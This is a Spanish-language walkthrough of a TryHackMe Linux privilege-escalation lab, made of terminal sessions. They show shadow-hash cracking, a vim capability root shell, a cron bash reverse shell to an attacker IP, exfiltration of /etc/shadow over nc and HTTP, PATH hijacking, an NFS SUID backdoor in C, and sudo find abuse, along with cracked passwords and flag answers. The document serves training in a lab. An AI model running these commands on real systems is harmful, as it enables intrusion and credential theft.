Length: 1364 (1.3K) [application/octet-stream]
Saving to: ‘shadow’

shadow                 100%[============================>]   1.33K  --.-KB/s    in 0s      

2024-10-17 09:34:43 (65.0 MB/s) - ‘shadow’ saved [1364/1364]
```

### le aplicamos el unshadow
```

unshadow passwd shadow  > cracked

root:*:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:*:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:*:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:*:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:*:103:106::/nonexistent:/usr/sbin/nologin
syslog:*:104:110::/home/syslog:/usr/sbin/nologin
_apt:*:105:65534::/nonexistent:/usr/sbin/nologin
tss:*:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:*:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:*:108:113::/nonexistent:/usr/sbin/nologin
sshd:*:109:65534::/run/sshd:/usr/sbin/nologin
landscape:*:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:*:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:!:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:!!:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:!:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:1001:1001::/home/gerryconway:/bin/sh
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:1002:1002::/home/user2:/bin/sh
lxd:!:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/home/karen:/bin/sh

```

#### lo crackeamos

```
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ unshadow passwd shadow > cracked
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ john cracked -w=/usr/share/wordlists/rockyou.txt   
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)     
3g 0:00:00:12 DONE (2024-10-17 09:39) 0.2323g/s 1368p/s 1923c/s 1923C/s paramedic..ellie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


Password1        (user2)  
                      
```

#### Vemos la bandera con base64

```
karen@ip-10-10-38-105:/tmp$ su user2
Password: 
$ pwd
/tmp
$ cd /home/ubuntu
$ ls
flag3.txt
$ cat flag3.txt
cat: flag3.txt: Permission denied
$ find / -name flag* 2>/dev/null
/home/ubuntu/flag3.txt
$ base64 -d /home/ubuntu/flag3.txt
Lsbase64: invalid input
$ bash -i 
user2@ip-10-10-38-105:/home/ubuntu$ base64 flag3.txt | base64 -d 
THM-3847834
user2@ip-10-10-38-105:/home/ubuntu$ 

```


### What is the content of the flag3.txt file?

```
user2@ip-10-10-38-105:/home/ubuntu$ base64 flag3.txt | base64 -d 
THM-3847834
user2@ip-10-10-38-105:/home/ubuntu$ 

```





## Task 8  - Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled capabilities.

When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

```
karen@ip-10-10-162-116:~$ getcap / -r 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
karen@ip-10-10-162-116:~$ 
```

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

```
karen@ip-10-10-162-116:~$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim
karen@ip-10-10-162-116:~$ 

```

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:

```
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```


```
karen@ip-10-10-203-61:~$ getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

/home/karen/vim = cap_setuid+ep

/home/ubuntu/view = cap_setuid+ep


./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'


```

### Complete the task described above on the target system 
```
karen@ip-10-10-162-116:~$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

Erase is control-H (^H).
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
# 

```

### How many binaries have set capabilities?

```
karen@ip-10-10-203-61:~$ getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

/home/karen/vim = cap_setuid+ep

/home/ubuntu/view = cap_setuid+ep

6
```

#### What other binary can be used through its capabilities?
view

#### What is the content of the flag4.txt file?
THM-9349843



## Task 9  - Privilege Escalation: Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.


### How many user-defined cron jobs can you see on the target system?  
```
karen@ip-10-10-67-121:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py


karen@ip-10-10-67-121:~$ 

4

```

### What is the content of the flag5.txt file?

```
karen@ip-10-10-67-121:~$ cat backup.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.6.13.236/6666 0>&1

karen@ip-10-10-67-121:~$ chmod +x backup.sh


┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ nc -lnvp 6666            
listening on [any] 6666 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.67.121] 60018
bash: cannot set terminal process group (12665): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-67-121:~# cd /root
cd /root
root@ip-10-10-67-121:~# ls
ls
snap
root@ip-10-10-67-121:~# cd /home/ubuntu
cd /home/ubuntu
root@ip-10-10-67-121:/home/ubuntu# ls
ls
flag5.txt                                                                                   
root@ip-10-10-67-121:/home/ubuntu# cat flag5.txt                                            
cat flag5.txt                                                                               
THM-383000283                                                                               
root@ip-10-10-67-121:/home/ubuntu# 


```

### What is Matt's password?

```

> Victima
karen@ip-10-10-57-26:~$ cd /home/karen/
karen@ip-10-10-57-26:~$ cat backup.sh 
#!/bin/bash
#cd /home/admin/1/2/3/Results
#zip -r /home/admin/download.zip ./*
chmod u+s /bin/bash #u+s is used give SUID permission


karen@ip-10-10-57-26:~$ chmod 777 backup.sh 

aren@ip-10-10-57-26:~$ bash -p
bash-5.0# id
uid=1001(karen) gid=1001(karen) euid=0(root) groups=1001(karen)
bash-5.0# cd /home/ubuntu
bash-5.0# ls
flag5.txt
bash-5.0# cat flag5.txt
THM-383000283
bash-5.0# cd /tmp
bash-5.0# cat /etc/passwd > passwd
bash-5.0# cat /etc/shadow > shadow

bash-5.0# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.6.13.236 - - [17/Oct/2024 17:55:25] "GET /shadow HTTP/1.1" 200 -
10.6.13.236 - - [17/Oct/2024 17:55:29] "GET /passwd HTTP/1.1" 200 -




> Kali

wget http://10.10.57.26:8080/shadow
wget http://10.10.57.26:8080/passwd

unshadow passwd shadow > cracked

john cracked -w=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (matt)     
Password1        (karen)     
2g 0:00:00:01 DONE (2024-10-17 12:56) 1.025g/s 1837p/s 1969c/s 1969C/s asdf1234..fresa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

123456
                        
```

## Task 10 - Privilege Escalation: PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

Typically the PATH will look like this:

```
karen@ip-10-10-175-107:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

    What folders are located under $PATH
    Does your current user have write privileges for any of these folders?
    Can you modify $PATH?
    Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:










### What is the odd folder you have write access for?

#### > mostramos la path
```

karen@ip-10-10-35-80:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
#### buscamos directorios writables
```
karen@ip-10-10-35-80:/home$ find / -writable 2>/dev/null | grep 'usr\|home'

/snap/core20/1169/usr/lib/systemd/system/cryptdisks-early.service
/snap/core20/1169/usr/lib/systemd/system/cryptdisks.service
/snap/core20/1169/usr/lib/systemd/system/hwclock.service
/snap/core20/1169/usr/lib/systemd/system/rc.service
/snap/core20/1169/usr/lib/systemd/system/rcS.service
/snap/core20/1169/usr/lib/systemd/system/sudo.service
/snap/core20/1169/usr/lib/systemd/system/x11-common.service
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/cryptdisks.service
/usr/lib/systemd/system/sudo.service
/usr/lib/systemd/system/screen-cleanup.service
/usr/lib/systemd/system/multipath-tools-boot.service
/usr/lib/systemd/system/x11-common.service
/usr/lib/systemd/system/lvm2.service
/usr/lib/systemd/system/rcS.service
/usr/lib/systemd/system/rc.service
/usr/lib/systemd/system/cryptdisks-early.service
/home/murdoch


/home/murdoch
```

```

```

### Exploit the $PATH vulnerability to read the content of the flag6.txt file.  
### Nos damos cuenta que en ese dir, hay un test que busca thm
```
aren@ip-10-10-35-80:/$ cd /home/murdoch/
karen@ip-10-10-35-80:/home/murdoch$ ls -la
total 36
drwxrwxrwx 2 root  root   4096 Oct 17 18:17 .
drwxr-xr-x 5 root  root   4096 Jun 20  2021 ..
-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
-rw-rw-r-- 1 karen karen    10 Oct 17 18:17 thm
-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
karen@ip-10-10-35-80:/home/murdoch$ ./test 
sh: 1: thm: not found

```

### What is the content of the flag6.txt file?

### crearemos un fake thm que el binario llama, modificamos la rutaa

```
karen@ip-10-10-35-80:/$ cd /tmp
karen@ip-10-10-35-80:/tmp$ echo "/bin/bash" > thm
karen@ip-10-10-35-80:/tmp$ cat thm 
/bin/bash
karen@ip-10-10-35-80:/tmp$ chmod 777 tm
chmod: cannot access 'tm': No such file or directory
karen@ip-10-10-35-80:/tmp$ chmod 777 thm 
karen@ip-10-10-35-80:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
karen@ip-10-10-35-80:/tmp$ export PATH=/tmp:$PATH
karen@ip-10-10-35-80:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
karen@ip-10-10-35-80:/tmp$ /home/murdoch/test 
root@ip-10-10-35-80:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-35-80:/tmp# cd /home/ubuntu/
root@ip-10-10-35-80:/home/ubuntu# cat flag6.txt
cat: flag6.txt: No such file or directory
root@ip-10-10-35-80:/home/ubuntu# ls
root@ip-10-10-35-80:/home/ubuntu# cd ..
root@ip-10-10-35-80:/home# cd matt/
root@ip-10-10-35-80:/home/matt# cat flag6.txt
THM-736628929
root@ip-10-10-35-80:/home/matt# 

```

## Task 11 Privilege Escalation: NFS

### How many mountable shares can you identify on the target system? 

```
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.245.200

Export list for 10.10.245.200:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

3
                   
```

### How many shares have the "no_root_squash" option enabled?  

```
aren@ip-10-10-245-200:/$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)


3
```

### Gain a root shell on the target system  

### Motamos la share en un dir dentro de /tmp

```
──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ showmount -e 10.10.245.200                         
Export list for 10.10.245.200:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
                                                                                                                    
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ mkdir /tmp/share                                   
                                                                                                                    
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ sudo mount -t nfs 10.10.245.200:/home/backup /tmp/share 
                                                                                                                    
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ 


```

### creamos el backdoor y lo pasamos al share
```
> en kali como root


┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ cat nfs.c
#include<unistd.h>
#include<stdlib.h>
int main() {
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}

┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ gcc -static nfs.c -o nfs

┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ sudo cp nfs2 /tmp/myshare     
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ sudo chmod +s /tmp/myshare/nfs2 





```

### What is the content of the flag7.txt file?

```
karen@ip-10-10-181-70:/home/ubuntu/sharedfolder$ ./nfs2
root@ip-10-10-181-70:/home/ubuntu/sharedfolder# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-181-70:/home/ubuntu/sharedfolder# cd ..
root@ip-10-10-181-70:/home/ubuntu# ls
sharedfolder
root@ip-10-10-181-70:/home/ubuntu# cd ..
root@ip-10-10-181-70:/home# ls
backup  matt  ubuntu
root@ip-10-10-181-70:/home# cd matt/
root@ip-10-10-181-70:/home/matt# ls
flag7.txt
root@ip-10-10-181-70:/home/matt# cat flag7.txt
THM-89384012
root@ip-10-10-181-70:/home/matt# 

```

## Task 12 Capstone Challenge

#### Accedemos a la maquina
- Username: leonard
- Password: Penny123

```
ssh leonard@10.10.164.245                          
The authenticity of host '10.10.164.245 (10.10.164.245)' can't be established.
ED25519 key fingerprint is SHA256:1dMTd32PB7hStUUoiefpE+ckRSQl9B6tlu4mBNO2v4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.164.245' (ED25519) to the list of known hosts.
(leonard@10.10.164.245) Password: 
Last login: Thu Oct 17 21:32:28 2024 from ip-10-100-2-58.eu-west-1.compute.internal
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "C.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
[leonard@ip-10-10-164-245 ~]$ 
[leonard@ip-10-10-164-245 ~]$ 

```
### What is the content of the flag1.txt file?
#### buscamos binarios con suid

```
[leonard@ip-10-10-164-245 ~]$ find / -perm /4000 2>/dev/null

/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1



```
#### Pasamos los shadow y passw y los crackeamos

```
> victima

[leonard@ip-10-10-164-245 tmp]$ base64 /etc/shadow | base64 -d > shadow
[leonard@ip-10-10-164-245 tmp]$ base64 /etc/passwd | base64 -d > passwd

leonard@ip-10-10-164-245 tmp]$ nc 10.6.13.236 6666 < shadow
[leonard@ip-10-10-164-245 tmp]$ nc 10.6.13.236 6666 < passwd

> kali

┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ nc -lnvp 6666 > shadow
listening on [any] 6666 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.164.245] 44662
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ nc -lnvp 6666 > passwd
listening on [any] 6666 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.164.245] 44664


┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ unshadow passwd shadow > cracked 

┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ john cracked -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)     




```

### accedemos a la bandera

```
leonard@ip-10-10-205-236 ~]$ su missy
Password: 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "C.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

[missy@ip-10-10-205-236 leonard]$ cd /home/missy/
 

[missy@ip-10-10-205-236 ~]$ find . -name flag* 2>/dev/null

./Documents/flag1.txt

[missy@ip-10-10-205-236 ~]$ cat Documents/flag1.txt 
THM-42828719920544
 

THM-42828719920544
```


### What is the content of the flag2.txt file?

#### que hay con sudo ?

```
[missy@ip-10-10-205-236 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-205-236:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-205-236:
    (ALL) NOPASSWD: /usr/bin/find
[missy@ip-10-10-205-236 ~]$ 

```

#### Explotamos sud0

```
[missy@ip-10-10-205-236 ~]$ sudo find . -exec /bin/sh \; -quit
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2# find / -name flag2.txt 2>/dev/null

/home/rootflag/flag2.txt
sh-4.2# 
sh-4.2# cat /home/rootflag/flag2.txt 
THM-168824782390238
sh-4.2# 


THM-168824782390238

```